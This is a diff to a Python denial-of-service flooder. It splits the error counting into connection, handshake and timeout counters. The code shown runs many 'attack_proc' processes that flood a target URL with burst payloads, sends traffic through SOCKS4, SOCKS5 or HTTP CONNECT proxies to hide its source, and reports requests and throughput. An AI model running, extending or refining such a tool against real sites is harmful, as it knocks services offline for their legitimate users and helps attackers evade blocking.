@@ -47,7 +47,7 @@ def socks4_handshake(s, host, port):
         return len(res) >= 2 and res[1] == 0x5a
     except: return False
 
-def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err, limit_type, limit_val, rps_pacer, proxies, proxy_type):
+def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err_conn, shared_err_hs, shared_err_to, limit_type, limit_val, rps_pacer, proxies, proxy_type):
     try:
         parsed = urlparse(target_url)
         host = parsed.netloc
@@ -75,13 +75,19 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
                 s.connect((p_host, int(p_port)))
                 
                 if proxy_type == 'socks5':
-                    if not socks5_handshake(s, host, target_port): raise Exception("SOCKS5 Fail")
+                    if not socks5_handshake(s, host, target_port): 
+                        with shared_err_hs.get_lock(): shared_err_hs.value += 1
+                        raise Exception("SOCKS5 Fail")
                 elif proxy_type == 'socks4':
-                    if not socks4_handshake(s, host, target_port): raise Exception("SOCKS4 Fail")
+                    if not socks4_handshake(s, host, target_port): 
+                        with shared_err_hs.get_lock(): shared_err_hs.value += 1
+                        raise Exception("SOCKS4 Fail")
                 elif proxy_type == 'http' and (scheme == 'https' or target_port == 443):
                     s.sendall(f"CONNECT {host}:{target_port} HTTP/1.1\r\nHost: {host}:{target_port}\r\n\r\n".encode())
                     res = s.recv(512)
-                    if not res or b"200" not in res: raise Exception("HTTP Tunnel Fail")
+                    if not res or b"200" not in res: 
+                        with shared_err_hs.get_lock(): shared_err_hs.value += 1
+                        raise Exception("HTTP Tunnel Fail")
             else:
                 s.connect((host, target_port))
 
@@ -122,8 +128,10 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
                     with shared_req.get_lock(): shared_req.value += burst_size
                     with shared_bytes.get_lock(): shared_bytes.value += len(full_payload)
                 except: break 
-        except:
-            with shared_err.get_lock(): shared_err.value += 1
+        except socket.timeout:
+            with shared_err_to.get_lock(): shared_err_to.value += 1
+        except Exception:
+            with shared_err_conn.get_lock(): shared_err_conn.value += 1
             if rps_pacer > 0: time.sleep(0.01)
         finally:
             if s:
@@ -152,7 +160,9 @@ def main():
 
     shared_req = multiprocessing.Value('i', 0)
     shared_bytes = multiprocessing.Value('Q', 0)
-    shared_err = multiprocessing.Value('i', 0)
+    shared_err_conn = multiprocessing.Value('i', 0)
+    shared_err_hs = multiprocessing.Value('i', 0)
+    shared_err_to = multiprocessing.Value('i', 0)
 
     rps_pacer = 0
     if args.rps > 0:
@@ -168,7 +178,8 @@ def main():
     processes = []
     for _ in range(args.threads):
         p = multiprocessing.Process(target=attack_proc, args=(
-            args.url, end_time, args.port, args.mode, shared_req, shared_bytes, shared_err, 
+            args.url, end_time, args.port, args.mode, shared_req, shared_bytes, 
+            shared_err_conn, shared_err_hs, shared_err_to,
             args.limit_type, args.duration, rps_pacer, proxies, args.proxy_type
         ))
         p.daemon = True
@@ -187,8 +198,9 @@ def main():
             mbps = ((curr_bytes - last_bytes) * 8) / (1024 * 1024)
             last_bytes = curr_bytes
             
+            total_err = shared_err_conn.value + shared_err_hs.value + shared_err_to.value
             progress = f"{elapsed}:{args.duration}" if args.limit_type == 'time' else f"{min(100, int((shared_req.value/args.duration)*100))}:100"
-            print(f"PROGRESS:{progress} | REQ: {shared_req.value} | THROUGHPUT: {mbps:.2f} Mbps | ERRORS: {shared_err.value}")
+            print(f"PROGRESS:{progress} | SUCCESS: {shared_req.value} | THROUGHPUT: {mbps:.2f} Mbps | ERRORS: {total_err} (CONNECTION:{shared_err_conn.value} HANDSHAKE:{shared_err_hs.value} TIMEOUT:{shared_err_to.value})")
             sys.stdout.flush()
     except KeyboardInterrupt: pass
 
